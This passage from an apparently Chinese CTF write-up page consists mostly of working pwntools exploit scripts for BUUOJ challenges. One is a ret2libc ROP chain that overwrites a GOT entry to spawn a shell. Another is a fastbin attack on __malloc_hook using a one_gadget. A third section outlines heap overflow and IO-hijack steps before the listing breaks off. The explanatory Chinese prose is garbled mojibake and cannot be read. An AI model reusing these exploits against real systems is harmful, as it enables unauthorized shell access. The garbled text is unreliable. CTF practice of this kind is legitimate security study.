<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#context</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">SigreturnFrame(kernel = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn1&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;./libc-2.24.so&quot;</span></span><br><span class="line"><span class="comment">#libc.so = &quot;&quot;</span></span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s) </span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#libcsearcher use</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">malloc_hook = main_arena-0x10</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;__malloc_hook&quot;, malloc_hook)</span></span><br><span class="line"><span class="string">obj = LibcSearcher(&quot;fgets&quot;, 0Xd90)</span></span><br><span class="line"><span class="string">libc_base = fgets-obj.dump(&#x27;fgets&#x27;)</span></span><br><span class="line"><span class="string">system_addr = libc_base + obj.dump(&quot;system&quot;)        #system</span></span><br><span class="line"><span class="string">binsh_addr = libc_base + obj.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line"><span class="string">log.info(&quot;system_addr:0x%x&quot;%system_addr)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#malloc_hook,main_aren Find</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">python2 LibcOffset.py libc-2.23.so</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#without stripped</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">puts_got = elf.got[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">puts_plt = elf.plt[&#x27;puts&#x27;]</span></span><br><span class="line"><span class="string">system_plt = elf.plt[&#x27;system&#x27;]</span></span><br><span class="line"><span class="string">read_plt = elf.plt[&#x27;read&#x27;]</span></span><br><span class="line"><span class="string">main_addr = elf.sym[&#x27;main&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment">#p = process([&#x27;/glibc/2.24/64/lib/ld-linux-x86-64.so.2&#x27;, &#x27;./hello&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;/glibc/2.24/64/lib/libc-2.24.so&quot;&#125;)</span></span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">29806</span>)</span><br><span class="line">    elf = ELF(binary)</span><br><span class="line">    <span class="comment">#libc = ELF(libc.so)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dockerDbg</span>():</span></span><br><span class="line">    myGdb = remote(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">30001</span>)</span><br><span class="line">    myGdb.close()</span><br><span class="line">    pause()</span><br><span class="line"><span class="comment">#b *$rebase(0xdbd)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func1</span>(<span class="params">size,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice\n&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    sla(<span class="string">&quot;size:\n&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func0</span>(<span class="params">addr,con</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;your choice\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">    sla(<span class="string">&quot;address:\n&quot;</span>,addr)</span><br><span class="line">    sa(<span class="string">&quot;content:\n&quot;</span>,con)</span><br><span class="line"></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x4005F0</span></span><br><span class="line">__stack_chk_fail_got = <span class="number">0x601020</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400a03</span></span><br><span class="line">ret = pop_rdi_ret + <span class="number">1</span></span><br><span class="line">start_addr = <span class="number">0x400670</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">0x110</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">func0(<span class="built_in">str</span>(__stack_chk_fail_got),p64(puts_plt))</span><br><span class="line"></span><br><span class="line">func1(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">puts_addr = u64Leakbase(<span class="number">0</span>)</span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;puts&quot;</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr-obj.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">system_addr = libc_base + obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system</span></span><br><span class="line">binsh_addr = libc_base + obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;A&quot;</span>*(<span class="number">0x110</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">func1(<span class="built_in">len</span>(payload),payload)</span><br><span class="line">sl(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></div></figure>




        <h1 id="äºŒã€magic"   >
          <a href="#äºŒã€magic" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€magic" class="headerlink" title="äºŒã€magic"></a>äºŒã€magic</h1>
      <p>è¯´å®è¯è¿™é¢˜é€†å‘æ²¡å¤ªçœ‹æ‡‚ï¼Œé€†åŠå¤©æ²¡é€†å‡ºæ¥ä¸ªå•¥ï¼Œè¿˜å¾—å¥½å¥½å­¦å­¦é€†å‘ï¼Œæ˜¯å­¦é•¿åšçš„ï¼Œä¸è¿‡é€†å‘å®Œäº‹æ®è¯´æŒºç®€å•çš„ï¼Œç›´æ¥è´´ä¸‹å­¦é•¿expå§ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./Magic&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">elf = ELF(binary)</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(binary)</span><br><span class="line">    <span class="comment"># libc = elf.libc</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/glibc/x64/2.27/lib/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment"># p = process(binary, env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so&quot;)</span></span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    port = <span class="number">28077</span></span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;/home/mtb0tx/share/ctf-pwn/libc/libc-2.27.so&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    sleep(<span class="number">0.5</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_a</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *&#123;0&#125; \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdb_b</span>(<span class="params">addr</span>):</span></span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(&#123;0&#125;) \n c&quot;</span>.<span class="built_in">format</span>(addr))</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :p.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\x00&#x27;</span>))   </span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">l64     = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">li      = <span class="keyword">lambda</span> tag, addr          :log.info(tag + <span class="string">&quot; -&gt; &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">ia      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line">menu = <span class="string">&quot;Input your choice: &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">a, idx, b</span>):</span></span><br><span class="line">    sla(menu,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(a))</span><br><span class="line">    sla(<span class="string">&#x27;Input the idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">magic</span>(<span class="params">a, idx, b, magic</span>):</span></span><br><span class="line">    sla(menu,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(a))</span><br><span class="line">    sla(<span class="string">&#x27;Input the idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(<span class="built_in">str</span>(b))</span><br><span class="line">    sla(<span class="string">&quot;Input the Magic&quot;</span>, magic)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">a, idx, b</span>):</span></span><br><span class="line">    sla(menu,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(a))</span><br><span class="line">    sla(<span class="string">&#x27;Input the idx&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(<span class="built_in">str</span>(b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">malloc_hook_s = libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook_s = libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">magic(<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">ru(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">main_arena_xx = l64()</span><br><span class="line">malloc_hook_addr = (main_arena_xx &amp; <span class="number">0xfffffffffffff000</span>) + (malloc_hook_s &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook_addr - malloc_hook_s</span><br><span class="line">free_hook_addr = libc_base + free_hook_s</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">li(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line">delete(<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">magic(<span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, p64(malloc_hook_addr - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  rax == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x30] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x50] == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(libc_base + <span class="number">0xf03a4</span>)</span><br><span class="line">magic(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, pl)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add(1, 1, 0)</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">delete(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></div></figure>


        <h1 id="ä¸‰ã€h3apclass"   >
          <a href="#ä¸‰ã€h3apclass" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€h3apclass" class="headerlink" title="ä¸‰ã€h3apclass"></a>ä¸‰ã€h3apclass</h1>
      <p>è¿™é¢˜è¿˜ä¸é”™å•Šï¼Œæœ‰æ§åˆ¶æº¢å‡ºçš„æƒ³æ³•ï¼Œä¹Ÿæœ‰æ²™ç®±ä¿æŠ¤ï¼ŒåŠ«æŒIOã€‚ä¸è¿‡æ¯”èµ›æ—¶å¹²å…¶ä»–å»äº†ï¼Œæ²¡æ€ä¹ˆåšï¼Œæœ€åçœ‹äº†çœ‹è§‰å¾—èƒ½åšï¼Œä½†æ˜¯æ—¶é—´å·²ç»ä¸å¤Ÿäº†ï¼Œè¿™é‡Œç®€å•å¤ç°ä¸€ä¸‹ã€‚</p>
<p>å…¶å®éš¾åº¦ä¹Ÿä¸å¤§ï¼Œæœ‰å‡ ä¸ªç‚¹</p>
<p>1.æº¢å‡ºé™åˆ¶</p>
<p>å°±æ˜¯å †æº¢å‡ºçš„æ—¶å€™ç”¨çš„æ˜¯strlen()æ¥è·å–sizeçš„ï¼Œè¿™æ ·éœ€è¦æŠŠå †ä¸­çš„å†…å®¹å¡«æ»¡ï¼Œæ‰èƒ½æº¢å‡ºåˆ°sizeä½ã€‚</p>
<p>2.editçš„æŠ€å·§</p>
<p>ç„¶ååæœŸä¿®æ”¹çš„æ—¶å€™ï¼Œç”±äºéœ€è¦æ”¹fdæŒ‡é’ˆï¼Œé€šå¸¸ç”¨p64(addr)æ¥ä¿®æ”¹å˜›ï¼Œä½†æ˜¯è¿™é‡Œç”±äºstrlen()çš„å…³ç³»ï¼Œåªèƒ½å‘é€6ä¸ªå­—èŠ‚ï¼Œå¤šå‡ºæ¥çš„\x00ä¸è¦å‘é€ï¼Œä¸ç„¶è¾“å…¥è¾“å‡ºå®¹æ˜“å¯¹ä¸ä¸Šï¼Œå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚</p>
<p>3.æ³„éœ²åœ°å€çš„æŠ€å·§</p>
<p>åŠ«æŒIOï¼Œä½†æ˜¯2.31ä¸‹éœ€è¦æˆ‘ä»¬æ³„éœ²å †åœ°å€å®ŒæˆORWåŠ«æŒï¼Œæ‰€ä»¥æŠŠIO_write_baseæ”¹ä¸ºmain_arena+96å¤„ï¼Œæ³„éœ²å †åœ°å€å’Œlibcï¼Œä¸è¿‡è¿™æ ·å‘é€çš„æ•°æ®é‡ä¼šæ¯”è¾ƒå¤§ï¼Œå»ºè®®ç”¨sleep(2)æ¥ç»™ç¨‹åºä¸€å®šçš„ç¼“å†²æ—¶é—´ã€‚</p>
<p>4.çˆ†ç ´ï¼Œç”±äºæ²¡æœ‰æ³„éœ²ï¼ŒåŠ«æŒIOåªèƒ½ç”¨çˆ†ç ´libcçš„æ–¹å¼æ¥è§£å†³ï¼Œä¸è¿‡ä¹Ÿåªæ˜¯1/16çš„æ¦‚ç‡ï¼Œè¿˜æ˜¯å¾ˆå¥½å‘½ä¸­çš„ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span 